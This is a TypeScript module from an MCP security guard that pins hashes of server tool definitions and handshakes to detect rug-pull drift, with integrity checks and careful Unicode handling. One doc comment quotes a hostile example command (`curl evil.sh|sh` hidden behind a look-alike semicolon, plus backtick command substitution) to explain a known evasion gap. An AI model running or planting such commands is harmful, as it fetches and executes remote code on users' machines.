/**
 * Schema-pin storage for mcpm-guard (v0.5.0, Next Step 6).
 *
 * Persists per-server, per-tool SHA-256 hashes of the tool definition
 * (description + schema + annotations) captured at install time. Drift
 * detection at runtime compares the live tools/list response against
 * the pin and blocks if the hash has changed — catching rug-pull attacks
 * structurally, complementing the regex-based pattern engine.
 *
 * Storage:
 *   ~/.mcpm/pins.json            — pin data, JSON, format_version-tagged
 *   ~/.mcpm/pins.json.integrity  — SHA-256 of pins.json contents (sidecar)
 *
 * The integrity sidecar (security review F4.2 / issue #19) is an UNKEYED SHA-256
 * of pins.json stored next to it with the same 0o600 perms (the sidecar write
 * itself now lives in the shared store-integrity.ts). It provides
 * INTEGRITY (tamper-EVIDENCE against accidental corruption / cross-machine
 * copies / a different OS-user account), NOT AUTHENTICITY against a
 * same-user/postinstall attacker: any process that can write pins.json can
 * also recompute and rewrite this sidecar to match, so there is no
 * attacker/writer asymmetry. A keyed scheme (HMAC/signature) would need a
 * secret the writable store lacks — same constraint as the secret store
 * (security issue #15); deferred to OS-keychain support. See security issue
 * #19. Any mismatch on read refuses to use the pin file until the user runs
 * `mcpm guard reset-integrity`.
 *
 * writePins finalizes via two sequential renames (content, then sidecar) —
 * see its own doc comment. readPins retries a mismatch briefly (TODOS #24)
 * so a reader landing in that window doesn't fail closed on an in-flight
 * write; a real tamper or a crash mid-write still reproduces every attempt.
 *
 * Two-target scope: install-time capture writes captured_via:"install".
 * If install-time spawn fails (OAuth, network), a placeholder entry with
 * current_hash:null + captured_via:"first-session" is written; the next
 * successful runtime tools/list fills the hash.
 */

import { createHash } from "node:crypto";
import { readFile, writeFile, unlink } from "node:fs/promises";
import { fileSha, writeFileAtomic } from "./store-integrity.js";
import path from "node:path";
import lockfile from "proper-lockfile";
import { z } from "zod";
import { getStorePath } from "../store/index.js";

const PINS_FILENAME = "pins.json";
const INTEGRITY_FILENAME = "pins.json.integrity";

export const PINS_FORMAT_VERSION = 1;

export type CapturedVia = "install" | "first-session" | "backfill";

/**
 * H4: per-field SHA-256 hashes of the SAME canonical leaves that feed
 * {@link hashToolDefinition}. Lets drift detection classify a whole-hash change
 * by WHICH field moved (description-only is cosmetic; schema/annotations is a
 * security-relevant capability change).
 */
export interface FieldHashes {
  description: string;
  schema: string;
  annotations: string;
}

export interface PinEntry {
  /** SHA-256 of JSON.stringify({description, schema, annotations}). null in first-session mode awaiting first session. */
  current_hash: string | null;
  /** Previous hashes kept for accept-drift history. */
  previous_hashes: string[];
  /** ISO 8601 timestamp. */
  captured_at: string;
  captured_via: CapturedVia;
  signature_list_version: string;
  /**
   * H4: per-field hashes (description / schema / annotations). OPTIONAL and
   * backward-compatible — pins captured before H4 lack this and fall back to
   * coarse whole-hash drift (treated conservatively as a security block). No
   * format_version bump: absence is a valid, known state.
   */
  field_hashes?: FieldHashes;
}

/**
 * H5: per-dimension SHA-256 hashes of the `initialize` handshake leaves we pin —
 * the declared `capabilities` object and `serverInfo.name`. Lets handshake-drift
 * detection tell a capability change from an identity change. NOTE: `instructions`
 * (free prose; already content-scanned by H1) and `serverInfo.version` (churns
 * every benign release) are DELIBERATELY excluded.
 */
export interface HandshakeFieldHashes {
  capabilities: string;
  serverName: string;
}

/**
 * H5: TOFU baseline of an MCP server's `initialize` handshake. Warn-tier only —
 * handshake drift NEVER blocks (blocking an initialize result kills the whole
 * session). Mirrors {@link PinEntry} but for the per-server handshake.
 */
export interface HandshakePinEntry {
  /** {@link hashHandshake} of the first-observed handshake field hashes. */
  current_hash: string;
  /** Whole-hashes already SURFACED to the user (warn-once cross-session dedup). */
  previous_hashes: string[];
  captured_at: string;
  /** "first-session" (TOFU). H3 install-pin capture is deferred. */
  captured_via: CapturedVia;
  signature_list_version: string;
  /** Per-dimension hashes — to tell capability-change from identity-change. */
  field_hashes: HandshakeFieldHashes;
  /** Sorted top-level keys of result.capabilities — for ADD vs REMOVE diffing. */
  capability_keys: string[];
}

export interface PinsFile {
  format_version: number;
  servers: Record<string, Record<string, PinEntry>>;
  /**
   * H5: per-server initialize-handshake pins. ADDITIVE + optional (no
   * format_version bump, mirrors H4's field_hashes): absence is a valid pre-H5
   * state; a present-but-malformed value fails the schema → readPins fails closed.
   */
  handshakes?: Record<string, HandshakePinEntry>;
}

// The integrity sidecar proves the BYTES are unchanged; it says nothing about
// the SHAPE. A structurally-malformed (but sidecar-consistent) pins.json — e.g.
// `servers` is an array, or an entry is missing `current_hash` — would slip
// through a bare `as PinsFile` cast and corrupt drift detection downstream.
// Validate the shape with Zod (mirrors policy.ts's GuardPolicyFileSchema) and
// throw a descriptive (NON-PinsIntegrityError) error so the user knows the file
// is structurally invalid, not tampered.
const FieldHashesSchema = z.object({
  description: z.string(),
  schema: z.string(),
  annotations: z.string(),
});
// #25: every hash this module writes is produced by hashToolDefinition (or the
// accept-drift `--new-hash` flag, which is validated against this same shape —
// see guard/drift.ts). A structurally-valid-but-garbage string like "garbage"
// previously passed PinEntrySchema as a bare z.string(), silently corrupting
// drift comparisons downstream. Fail closed on shape instead.
export const HASH_REGEX = /^sha256:[0-9a-f]{64}$/;
const HashSchema = z.string().regex(HASH_REGEX);
const PinEntrySchema = z.object({
  current_hash: HashSchema.nullable(),
  previous_hashes: z.array(HashSchema),
  captured_at: z.string(),
  captured_via: z.enum(["install", "first-session", "backfill"]),
  signature_list_version: z.string(),
  // H4: optional + last field. A present-but-malformed value (non-object,
  // missing string fields) fails the schema → readPins rejects (fail closed).
  field_hashes: FieldHashesSchema.optional(),
});
// H5: handshake-pin schema, mirrors PinEntrySchema. A present-but-malformed
// `handshakes` value (missing fields, non-object field_hashes) fails the schema
// → readPins rejects (fail closed). Absence parses fine for pre-H5 files.
const HandshakeFieldHashesSchema = z.object({
  capabilities: z.string(),
  serverName: z.string(),
});
const HandshakePinEntrySchema = z.object({
  current_hash: HashSchema,
  previous_hashes: z.array(HashSchema),
  captured_at: z.string(),
  captured_via: z.enum(["install", "first-session", "backfill"]),
  signature_list_version: z.string(),
  field_hashes: HandshakeFieldHashesSchema,
  capability_keys: z.array(z.string()),
});
const PinsFileSchema = z.object({
  format_version: z.number(),
  servers: z.record(z.string(), z.record(z.string(), PinEntrySchema)),
  // H5: optional + additive. Same backward-compat discipline as field_hashes.
  handshakes: z.record(z.string(), HandshakePinEntrySchema).optional(),
});

// ---------------------------------------------------------------------------
// Pure helpers
// ---------------------------------------------------------------------------

/**
 * Stable hash of a tool definition. Stringifies in canonical (sorted-key)
 * form so equivalent JSON with different key order produces the same hash.
 */
const sortedReplacer = replacerFor("NFC");
/** #26: candidate spellings a pre-NFC pin could have been taken over. */
const legacyReplacers = [replacerFor("NFD"), replacerFor(null)];

export function hashToolDefinition(input: ToolDefinitionFields): string {
  return hashLeaf(definitionLeaves(input), sortedReplacer);
}

/** The three leaves the pin hash covers. */
export interface ToolDefinitionFields {
  description?: string | null;
  schema?: unknown;
  annotations?: unknown;
}

/** The canonical leaves the whole-definition hash covers. */
function definitionLeaves(input: ToolDefinitionFields) {
  return {
    description: input.description ?? "",
    schema: input.schema ?? null,
    annotations: input.annotations ?? null,
  };
}

/**
 * #26: does a stored pin hash still describe this live definition?
 *
 * Also accepts the hashes a PRE-#26 pin could carry, so existing pins do not read
 * as drift on upgrade — for a schema-side hash that would be a false hard-block
 * on `tools/list`, and it removes any need for a `PINS_FORMAT_VERSION` bump.
 *
 * A pin stores a hash, never the text, so the only way to ask "was this pinned
 * over the same text?" is to re-spell the LIVE definition and hash each spelling
 * un-normalized, the way <=v0.35.0 did: NFD (a pin taken when the server emitted
 * decomposed text — the macOS case #26 exists for) and as-is (byte-identical).
 * The NFC spelling is `liveHash` itself. This widens nothing beyond the fold that
 * is already applied: every candidate is a canonically-equivalent re-spelling of
 * the live text, so a match proves the pinned and live text are canonically
 * equivalent — the same boundary, and the same three ASCII images, documented on
 * {@link replacerFor}. Runs only on a mismatch, and an all-ASCII definition —
 * almost all of them — matches on `liveHash` alone.
 *
 * ponytail: the pin is deliberately NOT rewritten to the NFC hash on a legacy
 * match — the fallback is permanent and idempotent, and re-pinning would need
 * write plumbing at both compare sites to buy only tidiness. Residual: a legacy
 * non-NFC pin whose definition then changes for real is classified against NFC
 * field hashes, so every field reads as changed and a description-only change
 * tiers as `block` instead of `warn`. Rare squared, and it over-blocks a
 * definition that genuinely changed; per-field legacy fallback if it ever bites.
 */
export function pinStillMatches(pinnedHash: string, liveHash: string, fields: ToolDefinitionFields): boolean {
  if (pinnedHash === liveHash) return true;
  const leaves = definitionLeaves(fields);
  return legacyReplacers.some((r) => pinnedHash === hashLeaf(leaves, r));
}

/**
 * #26: the per-field hashes a PRE-#26 pin could carry — the same candidate
 * spellings {@link pinStillMatches} uses for the whole hash.
 *
 * Needed because `pinStillMatches` guards only the WHOLE hash; once it reports a
 * real change, H4 tiers the drift by comparing FIELD hashes, and a legacy pin's
 * fields are un-normalized. Without this, a legacy pin holding non-NFC text in
 * its schema reported that schema as changed on a description-only edit, turning
 * a `warn` into a hard `block` — a regression against pre-#26 behaviour, in the
 * direction this project ranks worst (measured; adversarial review).
 */
export function legacyFieldHashCandidates(input: ToolDefinitionFields): readonly FieldHashes[] {
  return legacyReplacers.map((r) => ({
    description: hashLeaf(input.description ?? "", r),
    schema: hashLeaf(input.schema ?? null, r),
    annotations: hashLeaf(input.annotations ?? null, r),
  }));
}

/**
 * #26: does a stored HANDSHAKE hash still describe this live handshake? Same
 * candidate-spelling argument as {@link pinStillMatches}. Handshake drift is
 * warn-only, but a spurious warn on upgrade is still an introduced false
 * positive, so the two paths stay symmetric.
 */
export function handshakeStillMatches(
  pinnedHash: string,
  liveHash: string,
  result: { capabilities?: unknown; serverInfo?: { name?: unknown } },
): boolean {
  if (pinnedHash === liveHash) return true;
  const name = typeof result.serverInfo?.name === "string" ? result.serverInfo.name : "";
  return legacyReplacers.some(
    (r) =>
      pinnedHash ===
      hashLeaf(
        {
          capabilities: hashLeaf(result.capabilities ?? null, r),
          serverName: hashLeaf(name, r),
        },
        r,
      ),
  );
}

/**
 * #26: the per-dimension handshake hashes a PRE-#26 pin could carry — the
 * handshake analogue of {@link legacyFieldHashCandidates}, and needed for the
 * same reason: {@link handshakeStillMatches} guards only the whole hash, after
 * which `classifyHandshakeDrift` compares the two dimensions separately. Without
 * it, a legacy pin holding non-NFC text reported the UNTOUCHED dimension as
 * drifted too, so a genuine capability change also claimed the server's identity
 * had changed ("possible impersonation") — a scary, false accusation.
 */
export function legacyHandshakeFieldCandidates(result: {
  capabilities?: unknown;
  serverInfo?: { name?: unknown };
}): readonly HandshakeFieldHashes[] {
  const name = typeof result.serverInfo?.name === "string" ? result.serverInfo.name : "";
  return legacyReplacers.map((r) => ({
    capabilities: hashLeaf(result.capabilities ?? null, r),
    serverName: hashLeaf(name, r),
  }));
}

/**
 * H4: hash EACH tool-definition field separately, using the SAME canonical
 * (sorted-key) form + leaf defaults as {@link hashToolDefinition}. The whole-hash
 * and these field hashes derive from identical canonical leaves, so a whole-hash
 * change implies (and is implied by) at least one field-hash change.
 */
export function fieldHashesOf(input: ToolDefinitionFields): FieldHashes {
  return {
    description: hashLeaf(input.description ?? ""),
    schema: hashLeaf(input.schema ?? null),
    annotations: hashLeaf(input.annotations ?? null),
  };
}

function hashLeaf(value: unknown, replacer = sortedReplacer): string {
  const canonical = JSON.stringify(value, replacer);
  return `sha256:${createHash("sha256").update(canonical, "utf8").digest("hex")}`;
}

/**
 * H5: per-dimension hashes of the pinned `initialize` handshake leaves. Reuses
 * {@link hashLeaf} (same canonical sorted form). DELIBERATELY excludes
 * `instructions` and `serverInfo.version`: a non-string name collapses to "" and
 * a missing `capabilities` collapses to null, so a version-only bump (or a name
 * that is absent vs. an empty string) produces identical field hashes.
 */
export function handshakeFieldHashesOf(result: {
  capabilities?: unknown;
  serverInfo?: { name?: unknown };
}): HandshakeFieldHashes {
  return {
    capabilities: hashLeaf(result.capabilities ?? null),
    serverName: hashLeaf(typeof result.serverInfo?.name === "string" ? result.serverInfo.name : ""),
  };
}

/**
 * H5: sorted top-level capability keys (e.g. ["resources","sampling","tools"]).
 * Empty list when `capabilities` is missing or not a plain object.
 */
export function handshakeCapabilityKeys(result: { capabilities?: unknown }): string[] {
  const caps = result.capabilities;
  if (caps === null || typeof caps !== "object" || Array.isArray(caps)) return [];
  return Object.keys(caps as Record<string, unknown>).sort();
}

/** H5: stable whole-hash of the handshake field hashes (the durable baseline value). */
export function hashHandshake(f: HandshakeFieldHashes): string {
  return hashLeaf({ capabilities: f.capabilities, serverName: f.serverName });
}

/**
 * #26: builds a canonical JSON.stringify replacer — sorts object keys, and folds
 * every string to Unicode normal form `form` (`null` = leave text as-is, which
 * reproduces the pre-#26 canonicalization byte-for-byte).
 *
 * {@link sortedReplacer}, the form everything is hashed and stored under, is
 * "NFC" — so a definition that flips NFD→NFC without changing what it says keeps
 * one hash instead of reading as drift (H4 tiers a schema-side change as `block`,
 * i.e. a false hard-block on `tools/list`). An all-ASCII definition is unaffected:
 * NFC is the identity on ASCII and folded keys sort identically, so pins written
 * by earlier versions keep matching without a `PINS_FORMAT_VERSION` bump.
 *
 * NFC and deliberately NOT NFKC. NFC is canonical equivalence only, so folded
 * strings RENDER identically. NFKC also folds compatibility characters (ﬁ→fi,
 * ①→1, full-width→half-width), which render differently — collapsing those would
 * let a server swap one visible definition for another under an unchanged hash.
 *
 * KNOWN BOUNDARY (security review, deliberately accepted): "renders identically"
 * is NOT "means identically to a byte-level consumer". Exactly three code points
 * have a printable-ASCII NFC image — U+037E→";", U+1FEF→"`", U+212A→"K" (verified
 * exhaustively over all of Unicode; the set is complete and contains no digit,
 * quote, bracket, slash or space). Both shell metacharacters matter, not just the
 * first: a schema default pinned as `ls /tmp\u037E curl evil.sh|sh` and later
 * flipped to a literal ";" keeps ONE hash, and so does `echo \u1FEFid\u1FEF`
 * flipped to backticks — command substitution, not merely a separator. The same
 * holds for a regex or an exact-match allowlist, none of which normalize. And
 * because KEYS fold too (when injective), this covers a schema property RENAME:
 * a property named U+212A renamed to "K" is a real wire-level change that
 * produces no drift.
 *
 * Kept folded anyway. All three have ordinary uses — the Kelvin sign in a unit
 * description, the Greek question mark and varia in Greek prose — so excluding
 * them buys a narrow evasion class at the price of false-BLOCKING those servers,
 * and this project ranks a wrong block worse than a miss. The evasion also
 * requires the attacker to have pinned a definition that ALREADY renders as the
 * malicious form. Recorded as a residual rather than silently absorbed.
 *
 * The non-NFC forms exist only to recognise a pre-#26 pin — see
 * {@link pinStillMatches}. They are never written.
 *
 * They do NOT reproduce <=v0.35.0 byte-for-byte, deliberately: they carry the
 * `Object.create(null)` fix below, so they emit a `__proto__` member that
 * v0.35.0 dropped. Consequence, accepted: a pin written before v0.36.0 over a
 * definition that has a `__proto__` schema property reads as drift once on
 * upgrade, even unchanged. **Making them drop it instead was tried and reverted**
 * — a `__proto__`-free candidate spelling is offered for EVERY pin, not just a
 * legacy one, so adding a `__proto__` property became invisible again and the fix
 * below disarmed itself (caught by its own regression test). The two cases are
 * indistinguishable from a hash alone, because a v0.35.0 hash carries no
 * information about that member at all. A near-empty population taking a
 * one-time, `accept-drift`-able block beats re-opening the hole for everyone.
 */
function replacerFor(form: "NFC" | "NFD" | null) {
  const fold = form === null ? (s: string) => s : (s: string) => s.normalize(form);
  return function canonicalReplacer(_key: string, value: unknown): unknown {
    if (typeof value === "string") return fold(value);
    if (value === null || typeof value !== "object" || Array.isArray(value)) return value;

    const obj = value as Record<string, unknown>;
    // Fold keys too, but ONLY while that stays injective for this object. Two
    // keys differing solely by normalization are distinct JSON members; if
    // folding collided them, one member would vanish from the hash and hide a
    // real difference. Non-injective => keep raw keys and let it read as drift.
    const keys = Object.keys(obj);
    const injective = new Set(keys.map(fold)).size === keys.length;
    const emit = injective ? fold : (k: string) => k;

    // Null prototype, NOT an object literal: assigning the key "__proto__" on a
    // literal hits the inherited setter, so the member never becomes an own
    // property and JSON.stringify omits it — a schema property named __proto__
    // was invisible to the pin hash, and could be added or altered with no drift
    // finding. Pre-existing (origin/main had the same `sorted[k] = obj[k]`),
    // fixed here because it is one word in the function being rewritten.
    const sorted: Record<string, unknown> = Object.create(null) as Record<string, unknown>;
    for (const [key, raw] of keys.map((k) => [emit(k), k] as const).sort((a, b) => (a[0] < b[0] ? -1 : a[0] > b[0] ? 1 : 0))) {
      sorted[key] = obj[raw];
    }
    return sorted;
  };
}

export function emptyPinsFile(): PinsFile {
  return { format_version: PINS_FORMAT_VERSION, servers: {} };
}

// ---------------------------------------------------------------------------
// Read / write with integrity sidecar
// ---------------------------------------------------------------------------

export class PinsIntegrityError extends Error {
  constructor(message: string) {
    super(message);
    this.name = "PinsIntegrityError";
  }
}

async function pinsPath(): Promise<string> {
  return path.join(await getStorePath(), PINS_FILENAME);
}

async function integrityPath(): Promise<string> {
  return path.join(await getStorePath(), INTEGRITY_FILENAME);
}

// writePins renames pins.json, THEN renames the sidecar (two separate atomic
// writes under one lock — see writePins). A reader landing in that gap sees
// new content next to the still-old sidecar and would otherwise fail closed
// on an in-flight write, not tamper (TODOS #24). Retry briefly before raising:
// the gap spans the second writeFileAtomic call's own several awaited fs ops
// (lstat + unlink-stale-tmp + write + rename — see store-integrity.ts), so
// 4 attempts × 20ms is generous headroom over it, not a single event-loop
// turn. A genuine mismatch (tamper, or a crash mid-write) still reproduces on
// every attempt.
const INTEGRITY_RETRY_ATTEMPTS = 4;
const INTEGRITY_RETRY_DELAY_MS = 20;

/**
 * Read the pin file + verify its integrity sidecar. Returns an empty pins
 * file if pins.json does not exist (first-run). Throws PinsIntegrityError
 * if the sidecar exists but does not match the file content — the user must
 * run `mcpm guard reset-integrity` before pins are usable again.
 */
export async function readPins(): Promise<PinsFile> {
  const filePath = await pinsPath();
  const sidecarPath = await integrityPath();

  let content = "";
  let mismatch: { expected: string; actual: string } | null = null;

  for (let attempt = 0; attempt < INTEGRITY_RETRY_ATTEMPTS; attempt++) {
    try {
      content = await readFile(filePath, "utf-8");
    } catch (err) {
      if ((err as NodeJS.ErrnoException).code === "ENOENT") {
        // A genuine first-run (no mismatch ever observed) is a clean empty
        // read. A file that DISAPPEARS after an earlier attempt already saw a
        // mismatch is more suspicious than a plain first-run — don't let its
        // absence silently clear that mismatch; fall through to the throw
        // below instead of granting a clean slate.
        if (mismatch === null) return emptyPinsFile();
        break;
      }
      throw err;
    }

    // If the sidecar exists, it must match. If the sidecar is missing, treat as
    // first-run — write a fresh sidecar on the next writePins.
    let sidecar: string | null = null;
    try {
      sidecar = (await readFile(sidecarPath, "utf-8")).trim();
    } catch (err) {
      if ((err as NodeJS.ErrnoException).code !== "ENOENT") throw err;
    }
    if (sidecar === null) {
      mismatch = null;
      break;
    }
    const actual = fileSha(content);
    if (actual === sidecar) {
      mismatch = null;
      break;
    }
    mismatch = { expected: sidecar, actual };
    if (attempt < INTEGRITY_RETRY_ATTEMPTS - 1) {
      await new Promise((resolve) => setTimeout(resolve, INTEGRITY_RETRY_DELAY_MS));
    }
  }
  if (mismatch !== null) {
    throw new PinsIntegrityError(
      `pins.json integrity check failed (expected ${mismatch.expected}, got ${mismatch.actual}). ` +
        `If you intentionally modified ~/.mcpm/pins.json (e.g., copied between machines), ` +
        `run \`mcpm guard reset-integrity\`. Otherwise, review ~/.mcpm/guard-events.jsonl ` +
        `for unauthorized activity.`,
    );
  }

  // The sidecar guarantees byte integrity; Zod guarantees the SHAPE. Anything
  // that parses as JSON but is not a well-formed PinsFile (e.g. a hand-edit, a
  // truncated write, an incompatible future schema) is rejected with a clear,
  // NON-PinsIntegrityError message so the user knows it is structurally invalid
  // rather than tampered.
  let json: unknown;
  try {
    json = JSON.parse(content);
  } catch (err) {
    throw new Error(
      `pins.json is not valid JSON (${(err as Error).message}). The file at ` +
        `~/.mcpm/pins.json is corrupt; remove it to start fresh or restore from a backup.`,
    );
  }
  const result = PinsFileSchema.safeParse(json);
  if (!result.success) {
    throw new Error(
      `pins.json has an invalid structure: ${result.error.issues
        .map((i) => `${i.path.join(".") || "<root>"}: ${i.message}`)
        .join("; ")}. The file is structurally invalid (not tampered); ` +
        `remove ~/.mcpm/pins.json to start fresh or restore from a backup.`,
    );
  }
  const parsed = result.data as PinsFile;
  if (parsed.format_version !== PINS_FORMAT_VERSION) {
    throw new Error(
      `pins.json format_version mismatch (file: ${parsed.format_version}, expected: ${PINS_FORMAT_VERSION}). ` +
        `Migration is not yet implemented — file an issue.`,
    );
  }
  return parsed;
}

/**
 * Write pins.json + refresh the integrity sidecar. Atomic via .tmp + rename.
 *
 * Uses proper-lockfile (security review F2) to serialize concurrent writes
 * from multiple IDE sessions hitting the same wrapped server. Without the
 * lock, two relays writing first-session pins can race and corrupt the
 * sidecar relative to pins.json.
 */
export async function writePins(pins: PinsFile): Promise<void> {
  const filePath = await pinsPath();
  const sidecarPath = await integrityPath();
  const serialized = `${JSON.stringify(pins, null, 2)}\n`;

  // Touch the file first if it doesn't exist — proper-lockfile requires the
  // target to exist before locking. Write VALID pins content, NOT "": a crash
  // (or a concurrent, unlocked readPins) between this touch and the atomic
  // write below must never observe a 0-byte pins.json — that throws
  // PINS-READ-ERROR and fails the guard closed / bricks the next launch.
  // readPins treats an absent sidecar as first-run, so this sidecar-less
  // intermediate parses cleanly; the lock+atomic writes below finalize it.
  try {
    await writeFile(filePath, serialized, { flag: "wx", mode: 0o600 });
  } catch (err) {
    if ((err as NodeJS.ErrnoException).code !== "EEXIST") throw err;
  }

  const release = await lockfile.lock(filePath, {
    retries: { retries: 5, minTimeout: 10, maxTimeout: 200 },
    stale: 5_000,
  });
  try {
    await writeFileAtomic(filePath, serialized, "pins");
    await writeFileAtomic(sidecarPath, fileSha(serialized), "pins");
  } finally {
    await release();
  }
}

/**
 * Force-regenerate the integrity sidecar from whatever pins.json currently
 * contains. Used by `mcpm guard reset-integrity` after the user has reviewed
 * the file and acknowledged the tamper warning.
 */
/** Returns true if a sidecar was (re)written, false if there was no pins.json. */
export async function resetIntegrity(): Promise<boolean> {
  const filePath = await pinsPath();
  const sidecarPath = await integrityPath();
  try {
    await readFile(filePath, "utf-8");
  } catch (err) {
    if ((err as NodeJS.ErrnoException).code === "ENOENT") {
      // Nothing to reset; remove any stale sidecar.
      await unlink(sidecarPath).catch(() => undefined);
      return false;
    }
    throw err;
  }

  // TODOS #24 (review finding): take the SAME lock writePins holds. Without
  // it, a concurrent writePins can rename pins.json to content B and its
  // sidecar to sha(B) while this function is between its own read and sidecar
  // write — leaving pins.json at B but the sidecar at sha(A), a permanent
  // mismatch readPins's retries can never clear (both files are individually
  // legitimate, just from two different writers). Re-read AFTER acquiring the
  // lock so the hash always matches whatever is on disk at write time.
  const release = await lockfile.lock(filePath, {
    retries: { retries: 5, minTimeout: 10, maxTimeout: 200 },
    stale: 5_000,
  });
  try {
    const content = await readFile(filePath, "utf-8");
    // Route the sidecar write through the same hardened atomic writer used by
    // writePins (assertNotSymlink + stale-.tmp unlink + {flag:"wx"}). A bare
    // writeFile(`${sidecarPath}.tmp`) + rename would follow a pre-placed symlink
    // at the sidecar (or its .tmp), redirecting the write onto an attacker-chosen
    // path — the exact gap the PR closed for the main pins/policy writes.
    await writeFileAtomic(sidecarPath, fileSha(content), "pins");
  } finally {
    await release();
  }
  return true;
}

// ---------------------------------------------------------------------------
// Mutation helpers — pure functions that return new PinsFile instances
// ---------------------------------------------------------------------------

export function upsertToolPin(
  pins: PinsFile,
  serverName: string,
  toolName: string,
  newEntry: PinEntry,
): PinsFile {
  const server = pins.servers[serverName] ?? {};
  return {
    ...pins,
    servers: {
      ...pins.servers,
      [serverName]: { ...server, [toolName]: newEntry },
    },
  };
}

/**
 * H5: immutably set a server's handshake pin. Parity with {@link upsertToolPin}.
 * Spreads `pins.handshakes ?? {}` so a pre-H5 file (no `handshakes` key) is
 * upgraded in place without mutating the input.
 */
export function upsertHandshakePin(
  pins: PinsFile,
  serverName: string,
  entry: HandshakePinEntry,
): PinsFile {
  return {
    ...pins,
    handshakes: { ...(pins.handshakes ?? {}), [serverName]: entry },
  };
}

/**
 * H5: safe handshake lookup via Object.hasOwn (F13) — defeats `__proto__` /
 * `constructor` confusion and never resolves an inherited prototype member.
 */
export function lookupHandshake(pins: PinsFile, serverName: string): HandshakePinEntry | undefined {
  const handshakes = pins.handshakes ?? {};
  if (!Object.hasOwn(handshakes, serverName)) return undefined;
  return handshakes[serverName];
}

export function clearServerPins(pins: PinsFile, serverName: string): PinsFile {
  if (!pins.servers[serverName]) return pins;
  const { [serverName]: _removed, ...rest } = pins.servers;
  return { ...pins, servers: rest };
}

/**
 * Move the current hash into previous_hashes + set a new current.
 * Used when a drift is "accepted" — preserves history without losing
 * the audit trail of prior hashes.
 */
export function acceptDrift(
  pins: PinsFile,
  serverName: string,
  toolName: string,
  newHash: string,
): PinsFile {
  const existing = pins.servers[serverName]?.[toolName];
  if (!existing) return pins;
  // H4: drop the stale field_hashes (they describe the OLD definition; keeping
  // them past a current_hash rewrite breaks the whole⟺field invariant and can
  // mis-tier a later drift toward less-safe). The entry reverts to coarse
  // SECURITY tiering until a fresh first-session capture re-derives them.
  const { field_hashes: _staleFieldHashes, ...rest } = existing;
  const updated: PinEntry = {
    ...rest,
    current_hash: newHash,
    previous_hashes: existing.current_hash
      ? [...existing.previous_hashes, existing.current_hash]
      : existing.previous_hashes,
    captured_at: new Date().toISOString(),
  };
  return upsertToolPin(pins, serverName, toolName, updated);
}
